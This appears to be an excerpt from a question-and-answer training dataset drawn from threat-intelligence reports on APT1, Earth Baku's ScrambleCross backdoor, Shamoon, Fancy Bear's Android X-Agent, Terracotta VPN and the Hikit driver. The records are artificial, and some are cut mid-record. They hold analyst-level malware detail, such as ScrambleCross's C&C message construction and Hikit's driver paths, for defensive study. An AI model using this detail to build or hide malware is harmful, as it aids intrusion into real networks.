    "instruction": "Small Headline: China's Oil Production in Thousands of Barrels per Day22\nAs seen in the chart above, China experienced a significant increase in oil production during 2009. This spike in production could be due to information that China gained from US firms through cyber espionage actions, such as Night Dragon. The Night Dragon attacks were believed to have begun circa 2007. According to Kirk, information taken during these attacks includes market intelligence reports and information on operational production systems.23  Similarly, the Mandiant report shows that the APT1 group has monitored Mandiant's energy industry customers from approximately the beginning of 2009 to 2012.24 During these attacks, APT1 would export terabytes of data from the victims to China. In tandem with these revelations, China's also aggressively pursued oil supply contracts during 2009.25 During this time major Chinese state oil companies acquired holdings in 18 different countries. China is determined to take on oil and gas infrastructure development and to acquire oil industry assets.26\nAlthough there is evidence that China has been conducting cyber espionage activities against oil industry targets as far back as 2007, there is only trivial growth until 2009. This could be a result of the time and recourse commitment required to process the data that was acquired. As mentioned, both the Night Dragon and APT1 attacks stole an enormous amount of data from English speaking companies. It is necessary for English-fluent operators to sift through this data and extract actionable information to report. This information would also need to be provided to experts in the field who could recognize the its vale, and that process would have to be done discreetly so as not to arouse suspicions. This would take time. The Mandiant report comments on the fact that there are limited English-fluent operators directly involved in the technical end of APT1, which would significantly hinder progress.27 Considering these factors and the timeframe for growth presented above, it is conceivable that the information and strategy for its use would not be available until 2009. At this point, China could act to increase the output of the holdings that they currently owned. Also, the information gained from market intelligence reports and possibly exploration reports could guide the state companies in deciding which new holdings to purchase during this time period. The new holdings would allow for increased output overall.\nSmall Headline: China's Investments\nChina's fervor for oil acquisition has not been limited to aggressive increases in holdings and contracts. These activities are likely only one piece of a global strategy to secure China's future oil requirements, including reserves that may not be productive today or in the immediate future. This overarching strategy has apparently led to a pattern of quiet investment, which may be a direct cause for concern in America. An article appearing in the Associated Press discusses these Chinese investments in Venezuela, the country with the largest proven oil reserves as of 2011, and throughout the Caribbean and South America. The article notes that \"when Venezuela seized billions of dollars in assets from Exxon Mo-\n22 U.S. Energy Information Administration.  (2013, February 12).

Over the past five years they have loaned Venezuela more than $35 billion.\" They have similarly provided aid to countries like Ecuador, another country within the top 20 of proven oil reserves. In some cases it appears that the Chinese are making loans that the countries will likely be incapable of repaying, placing them squarely within China's control. Many of the deals included \"repayment in oil and natural gas\" and billions of dollars have been loaned directly to energy companies in Russia and Turkmenistan, both of which have been targeted in cyber espionage campaigns and are in the top 5 for proven natural gas reserves.\nAlthough the IEA has predicted that America is moving towards energy independence and is poised to become the number one oil exporter by 2017, the loans are breeding closeness with and reliance on China by countries in close proximity to the US. This could allow for the Chinese to weaken American influence in the region and create agitation against the US or between other countries within the region in order to distract the US from its goals in other areas strategic to the Chinese. These deals also place China in the supply chain for borrowers' projects where China has insisted on Chinese companies being involved as a stipulation of the loan. These loans have not required any economic reforms to accompany them, meaning that countries which could not secure a loan from the IMF due to poor financial decisions may continue to flounder in spite of aid, perhaps even more so because of it. In the worst case scenario, these countries become unstable. While this may cause issues to the Chinese in some logistical capacities, it would also serve to divert some of America's attention, making the situation a palatable outcome for China.\nSmall Headline: Other actors\nAn analysis of these events would be remiss without exploring any other possible attribution. Though unlikely, it is possible that there were other actors involved. As pointed out by Eugene Kaspersky in his criticism of the Shady RAT report, some of the tools and techniques are generic enough to not lend themselves to attribution to a particular entity. Even the ones that are of Chinese origin do not of themselves implicate the Chinese government, only an actor familiar with how the tool works or minimally trained in Mandarin. A large portion of these tools were freely available on underground Chinese hacking sites. Chinese hacking collectives or corporations may have been independently involved. However, due to the suspicions voiced in the leaked diplomatic cables suggesting PLA involvement28 and Mandiant's research on the topic indicating the same29 , it is highly unlikely that the Chinese government was not involved whatsoever. These sources, and the timeframe in which the attacks occurred -- between roughly 9am and 5pm consistently over a protracted period of time3031 -- is indicative of a formalization of the activity. This is further evidenced by the resources required to carry out the attack and the Chinese government's grasps on censorship of their citizens through technical controls. Terabytes of data infiltrating the country is unlikely to have been missed, particularly over the course of a decade of activity.\nIf China had been involved in any capacity in cyber espionage attacks and this had been discovered by another entity, said entity might have leveraged this knowledge to collude with them either through coercion, cooperation, or clandestinely without the Chinese government knowing. Though this may seem farfetched, a report released by a Luxemburg security firm details how, in the wake of Mandiant's APT1 report, they decided to engage in an intelligence gathering operation on the APT groups operating out of China. By scanning Chinese IP ranges for C2 servers known to be used in the APT1 attacks and exploiting weaknesses in the attackers' C2 infrastructure, they were able to access, monitor, and control the APT infrastructure without the adversary's knowledge. Bloomberg also hinted at the possibility of American security firms acting in a similar way when they \"exploit[ed] a hole in the hackers' security \u2026 logging the intruders' every move as they crept into networks...\" Knowing that the Chinese were actively engaged in such operations and likely turning a blind eye to any infiltration of data, another actor operating through China and attempting to incriminate China could have engaged in cyber espionage as well. This is truly a stretch of the imagination, and there is no evidence whatsoever to support this theory. The most likely case for any attribution involves the Chinese government in some capacity.\n28  Glanz, J. & Markoff, J. (Dec 4 2010). Vast Hacking by a China Fearful of the Web.

    "instruction": "Medium Headline: ScrambleCross, or a Refactored Crosswalk\nDuring our analysis, we found a never-before-seen shellcode as a payload of StealthMutant and StealthVector. Upon closer study, we learned that this payload uses similar techniques to those of the Crosswalk backdoor. A modularized shellcode-based backdoor that is known to be used by Earth Baku, Crosswalk can execute additional shellcodes on memory as a plug-in. According to an indictment by the US Department of Justice,17 Crosswalk was also used by members of Chengdu 404 Network Technology, a network security business. The similarities between Crosswalk and ScrambleCross indicate that the actual entity behind this campaign could be or is linked to members of Chengdu 404 Network Technology.\nFollowing our analysis, we have concluded that this unknown payload is a new version, or rather a fully refactored version, of Crosswalk. It still has many of the same capabilities as Crosswalk, but these are implemented differently. Considering this, we have named this new backdoor ScrambleCross to distinguish it from its predecessor.\nScrambleCross shares the following features with Crosswalk:\n\u2022 It is designed as fully position-independent code.\n\u2022 It has encrypted code, data, and configuration.\n\u2022 It calculates the hash of the code section as an anti-debugging technique.\n\u2022 It supports multiple types of network communication protocols.\n\u2022 It uses message queues to asynchronously receive commands from worker threads.\nCrosswalk's capabilities have been documented at length by the likes of Positive Technologies, ZScaler,18 and  VMware Carbon Black.19 But there are some key differences between this backdoor and ScrambleCross. Much like Crosswalk, ScrambleCross also embeds encrypted code in itself, but it uses a slightly different encryption algorithm to do so. To decode its functions and global values, including imports or strings, ScrambleCross uses a 16-byte XOR, as shown in Figure 41.\nHowever, for its network configuration, ScrambleCross uses ChaCha20 for decryption instead of XOR (Figure 42). The encrypted network configuration is embedded at offset 0x1028 from the top of the configuration.\nLike StealthVector, ScrambleCross uses a fixed value of 0xB for its initial counter. The ChaCha20 routine shown in Figure 43 is used for encryption and decryption.\nWith regard to its command-and-control (C&C) server communication, Crosswalk supports TCP (Transmission Control Protocol) and HTTP for application layer protocols, and uses AES-128 for transport layer encryption. ScrambleCross similarly supports TCP, HTTP, and HTTPS for application layer protocols, but it instead uses ChaCha20 and a custom message structure for transport layer encryption. Regardless of whether TCP or HTTP protocols are used, both the client request and the C&C server response have the same message structure.\nThe client request data is compiled in the following nine steps, as illustrated in Figure 44. On the other hand, after deconstructing the server response data, we found that it is compiled in reverse order.\n1. Receive a 16-byte challenge from the server, or generate a 16-byte null key instead.\n2. Generate a random 16-byte ChaCha20 nonce.\n3. Generate a 32-byte ChaCha20 key.\n4. Compress the raw request data using the LZ4 compression algorithm.\n5. Encrypt the payload chunk with ChaCha20, using the key generated in Step 3. The nonce is the first 12 random bytes generated in Step 2.\n6. Calculate the MD5 hash of the victim information. The victim information consists of the globally unique identifier (GUID), botID, and computer name of the victim's device.\n7. Encrypt the header chunk with ChaCha20, using the key embedded in the network configuration. The nonce is the last 12 random bytes generated in Step 2.\n8. Calculate the total size of the MD5 hash, which is the sum of 13, the nonce, the encrypted header chunk, and the encrypted payload chunk. Copy the MD5 hash onto the top of the message data.\n9. If the message is sent in TCP, add the size of the message data on top of the message data.\nScrambleCross, like Crosswalk, also receives backdoor commands from its C&C server, as shown in Figure 45, but these are very different from those for Crosswalk. In the case of ScrambleCross, the purpose of its backdoor commands is to receive plug-ins from the C&C server and to manipulate these plug-ins, as indicated in Table 1. However, since a backdoor command's capacity for manipulating plug-ins depends on the specific plug-in it receives, and we have been unable to retrieve any plug-ins from the server, we have yet to determine the full extent of the commands' plug-in manipulation functions.\nBecause ScrambleCross supports HTTPS, some variants of this backdoor abuse Cloudflare Workers, a computing platform, to obscure their C&C server activity. Cloudflare Workers can prove to be a powerful and accessible tool for malicious actors for the following reasons:\n\u2022 Cloudflare Workers provides better scalability, making it useful for malicious actors who want to build their C&C infrastructure.\n\u2022 The malware will not communicate with the C&C server directly, posing a challenge for security analysts to find the actual IP address to block. C&C traffic on Cloudflare Workers makes blocking of ScrambleCross' C&C server much more difficult because the observed IP address is a Cloudflare IP address rather than that of the actual C&C server.\n\u2022 The Cloudflare Workers platform is allowed by many security products. Connections to Cloudflare Workers are often considered legitimate and thus will likely be overlooked by network monitoring solutions.\nBig Headline: Conclusion and Security Recommendations\nThe discovery of these new pieces of malware demonstrates that Earth Baku consists of members with varied skill sets. The group's use of the StealthMutant and StealthVector loaders indicates that among their ranks is at least one member who is familiar with tools and techniques used by red teams. Likewise, the group's use of the ScrambleCross backdoor points to at least one member who likely has a deep knowledge of low-level programming and complex software development.\nEvidence of members with these collective skills obscures the true purpose behind this new campaign. Even though Earth Baku engaged in ransomware attacks in early 2020,20 we have not observed the use of ransomware in this new campaign. Instead, as a report by Group-IB suggests,21 this latest campaign by Earth Baku may be focused on cyberespionage. It is our hope that this report will encourage other security researchers to publish further research about this threat actor group and its activities.\nHere are several measures that end users and organizations can take to defend their networks and systems against cyberespionage tactics and minimize the risk of compromise:\n\u2022 Practice the principle of least privilege. Limit access to sensitive data and carefully monitor user permissions to make lateral movement more difficult for attackers who want to infiltrate a corporate network.\n\u2022 Be mindful of security gaps. Regularly update systems and applications, and enforce strict patch management policies. Practice virtual patching to secure any legacy systems for which patches are not yet available.\n\u2022 Have a proactive incident response strategy. Implement defensive measures that are designed to assess threats and mitigate their impact in the event of a breach. Routinely carry out security drills to test the efficiency of the organization's incident response plan.\n\u2022 Enforce the 3-2-1 rule. Store at least three copies of corporate data in two different formats, with one air-gapped copy located off-site. Routinely update and test these copies to ensure that there are no errors in the backup process.\nEnterprises and government agencies can benefit from advanced Trend Micro solutions that can proactively keep IT environments protected from a wide range of cybersecurity threats. The Trend Micro\u2122 XDR service effectively protects connected emails, endpoints, servers, cloud workloads, and networks.22 It uses powerful AI and expert security analytics to correlate data, and deliver fewer yet higher-fidelity alerts for early threat detection. In a single console, it provides a broader perspective of enterprise systems while at the same time giving a more focused and optimized set of alerts. This allows IT security teams to have better context for identifying threats more quickly and therefore to understand and remediate impact much more effectively.\nThe Trend Micro\u2122 Managed XDR service, meanwhile, provides expert threat monitoring, correlation, and analysis from skilled and seasoned managed detection and response analysts.23 Managed XDR is a flexible, 24/7 service that allows organizations to have a single source of detection, analysis, and response. Analyst expertise is enhanced by Trend Micro solutions that are optimized by AI and enriched by global threat intelligence. The Managed XDR service allows organizations to expand with the cloud without sacrificing security or overburdening IT teams.\n\nWhat are the implications of Earth Baku's use of the ScrambleCross backdoor in terms of the group's capabilities and potential objectives? How does this differ from their previous activities involving ransomware?",
    "output": "The use of the ScrambleCross backdoor indicates that Earth Baku has members with deep knowledge of low-level programming and complex software development. Unlike their previous activities involving ransomware, this new campaign appears to be focused on cyberespionage. The sophisticated nature of ScrambleCross suggests that the group is evolving its tactics and objectives, potentially aiming to gather sensitive information rather than directly seeking financial gain through ransomware attacks.",

While Symantec has yet to see any evidence of a notable uptick in activity, this should not be misinterpreted, since planned operations could take some time to prepare and execute.\nOrganizations associated with the U.S. and its allies are an obvious target. While Iranian actors have, to date, heavily focused on organizations in the Middle East, attacks against the U.S. should not be ruled out, particularly considering the heightened state of tensions at present.\nHowever, organizations based in the Middle East are probably those most at risk, given that Iranian groups know this region best and may already have ongoing compromises. Destructive attacks, such as those involving disk wipers, usually require some prior compromise of the organization's network. This may mean that any potential destructive attacks could be focused on the Middle East, particularly if the attackers are under time pressure to retaliate.\nMost destructive attacks originating from Iran have involved Shamoon disk-wiping malware. Since Shamoon leverages the legitimate Eldos driver to wipe machines, organizations concerned about a potential Shamoon attack could mitigate the risk of exposure by hunting for and disabling the Eldos driver on their network.\nIn addition to this, any organization that has found evidence of an intrusion by any Iran-linked group in the past should remain on high alert, since attacks frequently rely on credentials stolen in earlier intrusions.\nNevertheless, any potential target (organizations publicly associated with or strategically important to the U.S. or its allies) should exercise extreme vigilance and review its security posture.\n\nQuestion: Why might organizations based in the Middle East be at a higher risk of destructive cyber attacks from Iranian threat groups, and what specific type of malware is commonly used in these attacks?

    "output": "Organizations based in the Middle East are at a higher risk of destructive cyber attacks from Iranian threat groups because these groups are more familiar with the region and may already have ongoing compromises. Destructive attacks often require prior compromise of the organization's network, which increases the likelihood of attacks in areas where Iranian groups are already active. The specific type of malware commonly used in these attacks is Shamoon disk-wiping malware. To mitigate the risk of exposure to Shamoon, organizations can hunt for and disable the Eldos driver on their network, as Shamoon leverages this legitimate driver to wipe machines.",

Events unfolded rapidly in Crimea. Pro-Russian gunmen seized key government buildings. On 1 March, the upper house of the Russian Parliament approved the deployment of troops in Ukraine to protect the\nRussian speaking minority. Russian military forces (coined 'little green men') were reportedly present in Crimea and blocked the positions of Ukrainian troops.9 A referendum, initiated by the Crimean Parliament, was held in Crimea on 16 March, which declared that 97% of voters supported joining Russia. Two days later, President Vladimir Putin signed a bill declaring Crimea to be part of the Russian Federation.10 These events were crucial in setting the stage for the ongoing conflict in eastern Ukraine, and led to a dramatic change in relations between Russia and the West.\n6 Eduard Kovacs.

Operations were conducted against Ukraine's mobile infrastructure, the mobile phones of members of the Ukrainian Parliament, and security communications. Some traditional methods were used, including the seizure of Ukrtelecom offices and the physical cutting of telephone and internet cables.11 Digital attacks included DDoS targeting Ukrainian, Crimean, NATO, and Russian websites. The pro-Russian hacker group CyberBerkut was particularly active against NATO,12 while groups like OpRussia and Russian CyberCommand directed their actions against Russian websites.13 Polish, Ukrainian, and Russian websites were also defaced, including the site of Russia Today, sometimes with historical references to World War II.14\nInformation leaks continued. A sensitive conversation between the Estonian Minister of Foreign Affairs Urmas Paet and EU (<https://en.wikipedia.org/wiki/High_Representative_of_the_Union_for_Foreign_Affairs_and_Security_Policy>)High Representative for Foreign Affairs (<https://en.wikipedia.org/wiki/High_Representative_of_the_Union_for_Foreign_Affairs_and_Security_Policy>)and Security Policy Catherine Ashton was made public, revealing their discussion of information suggesting that both sides, the opposition and the government, were responsible for sniper killings during the Maidan protests.15 Anti-Russian motivated information leaks included the disclosure of the names of members of Berkut, the anti-riot police,16 as well as documents belonging to a Russian defence contractor.17\nDuring this time, it also became clear that the spyware Snake (also known as Ouruborus or Turla) was used against several targets in Ukraine, including the government. Snake is sophisticated malware, known to be in use for at least eight years, whose origin is uncertain, but believed to be developed in Russia.18\n9 Vitaly Shevchenko.

    "instruction": "Context: Big Headline: DEVELOPMENT AND DISTRIBUTION PROCESS OF THE BENIGN APPLICATION\n\" THE ORIGINAL, BENIGN APPLICATION ENABLED ARTILLERY FORCES TO MORE RAPIDLY PROCESS TARGETING DATA FOR THE D-30 HOWITZER REDUCING TARGETING TIME FROM MINUTES DOWN TO 15 SECONDS.\n\"\nThe original application central to this discussion, \u041f\u043e\u043f\u0440-\u041430.apk, was initially developed domestically within Ukraine by a member of the 55th Artillery Brigade. Based on the file creation timestamps as well as the app signing process, which occurred on 28 March 2013, CrowdStrike has determined that the app was developed sometime between 20 February and 13 April 2013.\nShortly after that time frame, on 28 April 2013, an individual bearing the same name as the application's developer promoted the application on Russian vKontakte3 pages associated with the artillery forces. The promotion of the program was likely limited to social media, and the distribution was controlled from the author's main page, \u00ab\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043d\u043e\u0435 \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0435\u043d\u0438\u0435 \u0441\u043e\u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0433\u043e \u0431\u043e\u044f\u00bb (translation: \"Modern combat software\").4 As an additional control measure, the program was only activated for use after the developer was contacted and issued a code to the individual downloading the application.\nNo evidence of the application has been observed on the Android app store, making it unlikely that the app was distributed via that platform. The control measures established by the developer to limit the use and proliferation of the \u041f\u043e\u043f\u0440-\u041430.apk application, coupled with its unique purpose, make its broad distribution on the Android store improbable.\nAt the time of this writing, it is unclear to what degree and for how long this specific application was utilized by the entirety of the Ukrainian Artillery Forces. Based on open source reporting, social media posts, and video evidence, CrowdStrike assesses that \u041f\u043e\u043f\u0440-\u041430.apk was potentially used through 2016 by at least one artillery unit operating in eastern Ukraine.\nMedium Headline: RECONNAISSANCE\nGiven the estimated development timeframe and the promotional period for the benign \u041f\u043e\u043f\u0440-\u041430.apk application, the program was likely available online for distribution after late April 2013. CrowdStrike Intelligence assesses that the application likely came to the attention of Russia-based adversaries around this time frame as a result of ongoing Russian\n\"\nFOR UKRAINIAN TROOPS, ARTILLERY FORCES HAVE ALSO SHOULDERED A HEAVY COST. IN 2 YEARS OF CONFLICT, THEY HAVE LOST NEARLY 50% OF THEIR ARTILLERY PIECES AND OVER 80% OF D-30 HOWITZERS, FAR MORE THAN ANY OTHER PIECE OF UKRAINIAN ARTILLERY. \"\nreconnaissance associated with the revolution in Ukraine. Actors with a nexus to Russia regularly monitor social media sites in order to better understand or formulate operations against their targets.\nCrowdStrike Intelligence has noted instances in which some Russia-based actors and attribution front groups have leveraged information obtained from Ukrainian social media sites in order to perform operations. The most notable recent example of this was in the case of extortion-based threats directed against the Polish Government.5 In this particular case, the perpetrators likely sought out openly available account information from a vKontakte page belonging to a Ukrainian citizen, who was soliciting donations to aid volunteer soldiers fighting in eastern Ukraine. The adversary then used this profile information, in conjunction with the name \"Pravyy Sector,\" to make it appear as though the extortion threats against the Polish government were originating from an ultranationalist Ukrainian group.\nCrowdStrike has assessed that by performing this type of deceptive operation the perpetrator likely sought to make it appear as though Ukrainian interests were threatening the Polish government. In addition, because the individual account hijacked for this operation had been used to try to raise funds for Ukrainian forces, the adversary may have been trying to aggravate Western governments enough to freeze the individual's accounts. The attack did not appear to achieve its intended result. Poland rebuffed the threats, and the owner of the vKontakte page denounced any involvement in the threat. Subsequently the Pravyy Sector group scrubbed their social media page of much of the information associated with this failed operation.\nThis particular incident is an example of how a disinformation operation is staged. While this incident is not likely to be related to the development of the X-Agent Android variant, it demonstrates the reconnaissance and pre-planning tactics that precede the rest of a campaign. Development and Distribution\nCrowdStrike has discovered indications that as early as 2015 FANCY BEAR likely developed X-Agent applications for the iOS environment, targeting \"jailbroken\" Apple mobile devices. The use of the X-Agent implant in the original \u041f\u043e\u043f\u0440-\u041430.apk application appears to be the first observed case of FANCY BEAR malware developed for the Android mobile platform. On 21 December 2014 the malicious variant of the Android application was first observed in limited public distribution on a Russian language, Ukrainian military forum. A late 2014 public release would place the development timeframe for this implant sometime between late-April 2013 and early December 2014.\n\" CROWDSTRIKE INTELLIGENCE HAS ASSESSED THAT THE DISTRIBUTION OF THE MALICIOUS APPLICATION TARGETED THE VERY ARTILLERY UNITS FOR WHICH THE BENIGN APPLICATION WAS DEVELOPED\u2014BRIGADES OPERATING IN EASTERN UKRAINE ON THE FRONTLINES OF THE CONFLICT WITH RUSSIAN-BACKED SEPARATIST FORCES DURINGTHE EARLY STAGES OF THE CONFLICT IN LATE-2014. \"\nDuring that proposed development timeframe, a number of significant events unfolded between Ukraine, Russia, and the international community. Most notably, Russian attempts to influence Ukrainian-EU relations resulted in the large-scale, Maidan protest movement, eventually resulting in the ouster of then-president Victor YANUKOVYCH, the invasion and annexation of the Crimean Peninsula by Russia, and the protracted armed conflict in eastern Ukraine. Therefore, the creation of an application that targets some of the front line forces pivotal in Ukrainian defense on the eastern front would likely be a high priority for Russian adversary malware developers seeking to turn the tide of the conflict in their favor.\nCrowdStrike Intelligence has assessed that the distribution of the malicious application targeted the very artillery units for which the benign application was developed\u2014brigades operating in eastern Ukraine on the frontlines of the conflict with Russian-backed separatist forces during the early stages of the conflict in late-2014. This assessment is based on a number of factors, but chief among them is the likelihood that a military member would only trust and use an application designed to calculate something as critical as targeting data if it was developed and promoted by a member of their own forces. The type of operational activity described here suggests an extremely sophisticated understanding of the target that only a skilled adversary would likely possess.\nBy late December 2014, the total number of Russian forces in the region was approximately 10,000 troops.6 Because the Android malware could facilitate gross position information, its successful deployment could have facilitated anticipatory awareness of Ukrainian artillery force troop movement, thus providing Russian forces with useful strategic planning information. Indeed, the 55th Artillery Brigade and similar artillery units operated frequently against pro-Russian separatists in eastern Ukraine. A video posted on 18 October 20157 specifically shows them employing the \u041f\u043e\u043f\u0440-\u041430.apk application and operating in the vicinity of eastern Ukraine.\nThe choice of the Russian language character set in the application further underscores the targeting of forces within eastern Ukraine, as Russian is the predominant language utilized in that region. An assessment of languages spoken by region based on the most recent census information illustrates the permeation of the Russian language in that region and highlights the value of providing Russian in the malicious \u041f\u043e\u043f\u0440-\u041430.apk application.\nOne alternative theory regarding the use of the Russian language in the application could be that targeting may have been directed at pro-Russian\nLANGUAGES SPOKEN BY REGION\nDistribution of Russian/Ukrainian Language Use in Ukraine8\nforces operating in eastern Ukraine. A relevant and likely counterargument for this theory, however, is that Russian forces likely have employed fire support systems and other technologies that can already calculate targeting data, negating the need for an application to perform this task. Additionally, the application was initially developed by a member of the Ukrainian army. An opposing force would probably not adopt technology developed by the enemy for use on the battlefield.\nAnswer this question: What methods did Russia-based adversaries likely use to discover the \u041f\u043e\u043f\u0440-\u041430.apk application, and how does this relate to broader reconnaissance tactics?",

    "instruction": "Big Headline: BEHIND THE TERRACOTTA NODES\nWhere do the various Terracotta VPN providers obtain the resources to build such a vast VPN network? Out of 1500+ common VPN nodes, it is possible that some servers or appliances were legitimately obtained and leased by the Terracotta VPN operators. We will describe how others were clearly compromised.  RSA Research proposes three possible candidates (three devices) encompassing 557 IP addresses. We believe these devices are the best possible candidates for legitimate lease by the Terracotta VPN perpetrators for the following reasons:\n1. Massive multi-homing: The minimum quantity of IP addresses per suspected-legitimately-leased-device is 51. Terracotta services are marketed as very cost-effective, offering availability of a large VPN network for approximately $3/month. Massive multi-homing of a single device is apparently a method for inflating the appearance of the network. A Terracotta VPN client pings and displays all available nodes, noting both the date each node came online and its current response-time. However, while the network may appear to offer multiple new nodes on a given day, nodes with the same enlistment date and similar response-times actually indicate a multi-homed device. Further, network analysis shows the VPN clients usually connect to only a single IP address assigned to each massively multi-homed device. This may result in lower maintenance overhead, and indicates that the Terracotta VPN operator knows full-well that there is just one device behind the large pool of available nodes. And while there is no performance benefit from having the VPN clients ping multiple IP addresses from the same devices, doing so perpetuates the illusion of a larger network than what exists. When connecting to each of the nodes depicted in the client UI below (several nodes reflecting one of three multi-homed devices RSA Research has identified) the exit IP addresses are randomly assigned from the large pool of available IP addresses.\n2. No public services other than PPTP VPN.  In instances where RSA Research has confirmed the compromise of an organization, the victim organizations used their Internet-facing servers for various use cases, none of which included VPN or Windows Remote Access services. If these were compromised devices, we would expect the devices to be used by their legitimate owners for other purposes prior to being enlisted as Terracotta VPN nodes.  If, on the other hand, a legitimate VPN provider was compromised, we expect the operators to have noticed that their authentication process and client-base had been hijacked.\nA login splash screen (Figure 3) associated with the device with hostname 3819027EEA6E42F indicates the use of Windows Server 2003 Enterprise x64 Server, with Simplified Chinese locale or Chinese language pack. The latter would be the Windows locale most-commonly used by mainland PRC or Singapore residents.\nQuestion: What characteristics distinguish legitimately leased devices from compromised ones in the Terracotta VPN network, and how can these distinctions aid in identifying and mitigating such threats?",
    "output": "Answer: Legitimately leased devices in the Terracotta VPN network are characterized by massive multi-homing, where a single device is assigned a large number of IP addresses to give the impression of a larger network. Additionally, these devices typically offer no public services other than PPTP VPN, which is unusual for compromised devices that would normally be used for various purposes by their legitimate owners. Compromised devices, on the other hand, often show signs of being used for other services before being enlisted as VPN nodes. Understanding these distinctions helps cybersecurity professionals identify potentially compromised devices within their networks. By monitoring for unusual VPN activity and checking for the presence of other public services, security teams can better detect and respond to unauthorized use of their resources, thereby mitigating the risks associated with such compromises.",

    "instruction": "Medium Headline: Gen 1 Driver\nThe Driver component of Gen 1 Hikit variants provides the interface between the victim's network interface card (NIC) and the DLL. The Driver is a NDIS (network) driver that integrates into the victim's network stack. The Driver intercepts any and all network communication that traverses the Windows network stack and potentially removes the data from the network stack under very specific conditions. When the Driver removes data from the network stack, the Driver stores the removed data in local buffers for the Gen 1 DLL to query against. The purpose of this behavior is to allow the DLL to interact with the network without utilizes the WinSock API which could potentially reveal the presence of Hikit.\nIn order to interact with the Driver, the DLL uses the function IoDeviceControl to send commands to the Driver. The Driver registers itself at both \\Device\\w7fw and \\DosDevices\\w7fw thereby allowing the DLL to access the Driver by performing a CreateFile request to \\\\.\\w7fw or \\\\.\\Globals\\w7fw in order to obtain a handle to the Driver. The Driver's interface supports the following OIDs:\nThe Driver will remove data from the network stack only if a new channel is being established. A new channel occurs when the Driver detects a trigger string. The trigger string is typically a short form HTTP request with the following trigger strings found in the wild:\nUp to and including Gen 1.1 Drivers required the DLL to specify the trigger string in addition to the authentication value whereas Gen 1.2 Drivers had the trigger strings hardcoded.\nIn Gen 1.2, whenever the Driver detects a trigger string, the Driver inspects the rest of the data received for the authentication value. If the token follows the trigger string (there is no specific limitation on how far from the trigger string the password token must be), then the Driver generates a new channel that the DLL will use as the conduit between the DLL and the client.\nThe Driver appears to be based off the NDIS example source code PassThru. More specifically, the author(s) of the Driver appear to have used the modified version of the PassThru example, PassThruEx, by James Antognini and Thomas Devine from a 2003 blog post1 .\nQuestion: How does the Gen 1 Driver component of Hikit malware interact with the network stack to maintain stealth, and what mechanisms does it employ to establish a new communication channel?",

This behavior allows the DLL to interact with the network without using the WinSock API, which could reveal the presence of Hikit. The Driver registers itself at both \\\\Device\\\\w7fw and \\\\DosDevices\\\\w7fw, enabling the DLL to access it via CreateFile requests to \\\\.\\\\w7fw or \\\\.\\\\Globals\\\\w7fw to obtain a handle to the Driver. The Driver removes data from the network stack only when establishing a new channel, which occurs upon detecting a trigger string. These trigger strings are typically short-form HTTP requests. Up to and including Gen 1.1 Drivers, the DLL specifies the trigger string and authentication value, while Gen 1.2 Drivers have these strings hardcoded. Upon detecting a trigger string, the Driver inspects the received data for the authentication value and generates a new channel for communication between the DLL and the client.",

We performed a of the attacks and were able to identify changes in the attack patterns along with new activity every quarter.\nThe threat actor mainly sought to obtain CDR data (call logs, cell tower locations, etc.) belonging to specific individuals from various countries.

    "instruction": "Medium Headline: Security Hacking\nA common method used in cyber reconnaissance and attack is the security exploit. A security exploit is a prepared application that takes advantage of a known weakness. It is a piece of software, data, or commands that utilize a bug, glitch, or vulnerability to cause an unintended or unanticipated behaviour to occur on computer software, hardware, or electronic devices. This can allow the attacker to take control of the computer, permitting its use for other tactics, such as DDoS discussed below. An exploit may be used to gain low-level entrance to a computer, after which a hacker can search for further exploits to attain high-level access such as system administrator (root). This tactic is known as privilege escalation. Once exploit vulnerability has been identified by security experts, a patch will be issued. For this reason hackers try to keep known exploits secret. These are known as zero day exploits, and hackers may catalogue large numbers of them for their own use or to be sold on the black market (Hines 2008). In 2006, Taiwan was hit with \"13 PLA zero-day attacks\", for which it took Microsoft 178 days to develop patches (Tkacik 2007).\nVulnerability scanners may be used to identify exploits. One such scanner known as a port scanner automates the process of finding weaknesses of computers on a network. These check to see which ports on a specified computer are 'open', available to access, and sometimes will detect what program or service is listening on that port. Turning from reconnaissance to attack, once an open port is found, large quantities of data can be sent in an attempt to cause a buffer overflow. This can cause exposure of data, memory loss, and/or a crash within the compromised system.\nThe primary means to identify computers used in cyber warfare is the IP address. An IP address is a numerical identification that network management assigns to devices participating in a computer network utilizing the Internet Protocol (TCP/IP) for communication between nodes. In essence, each computer has its own unique IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) is responsible for global IP address allocation. ICANN, a non-profit organisation operating in the US, is under contract with US Department of Commerce and previously with US Department of Defense. Despite this identification tool, hackers can mask their identity by using proxy servers. Information is routed through multiple computers, only showing each computer's identity to the next in line. For example, a Chinese hacker could route his or her activity through a computer in Brazil, which routes its activity through Russia. The computer in Russia could be used to attack a computer in the US, and the US would see it as an attack from Russia.  Perhaps through painstaking effort the American investigators can identify that the Russian computer was a proxy, but then they are led to Brazil. If they manage to go from Brazil to China, they are still unsure whether China was the originator or simply another link in the chain. Proxy servers can be rented or obtained through compromised systems. Additionally,\nfree software such as Tor (The Onion Router), encryption, tunnelling protocol, and wireless access points (hotspots) add additional anonymity.\nA spoofing attack is when a person or program fools another into thinking it is someone or something else. One example is the man-in-the-middle attack, in which person C gets person A to believe they are person B, and they get person B to believe they are person A, thus gaining access to information sent in both directions. This is accomplished by monitoring packets sent from A to B (often involving a packet sniffer), guessing their sequence and number, knocking them out with a SYN attack, and injecting packets from C. Firewalls may defend against these attacks, if they have been configured to only accept IP addresses from the intended correspondent.\nWebpage spoofing, known as phishing, imitates a webpage such as a bank's website. When the user enters their data, such as passwords and usernames, the fake website catalogues their information. Webpage spoofing is often used in conjunction with URL spoofing, using an exploit to display a false URL, and DNS cache poisoning to direct the user away from their intended site and then back again when the data has been collected. As a precaution some websites require a user to arrive at their login page from a specified referrer page, but these referrer pages may also be spoofed. During the 2008 Olympics net users in China received a high volume of email spam offering video highlights of the games. Clicking on the links brought users to spoofed CNN pages which asked them to download a codec to watch the videos; once installed the computer was compromised and become a part of the Rustock botnet, i.e. an automated 'robot' running on the web to generate false headlines that entice people to load harmful code (Miller 2008; Hi-tech Thieves Target Olympics 2008).\nSpoofing may also be used defensively. For example, the Recording Industry Association of America (RIAA) has practised spoofing on peer to peer networks. The RIAA floods these communities with fake files of sought-after material. This deters down loaders by means of fear and by wasting their time and bandwidth. This could be employed in the same manner by militaries, or as a source of disinformation. A similar defensive tactic, known as a honey pot, lures criminals in by offering 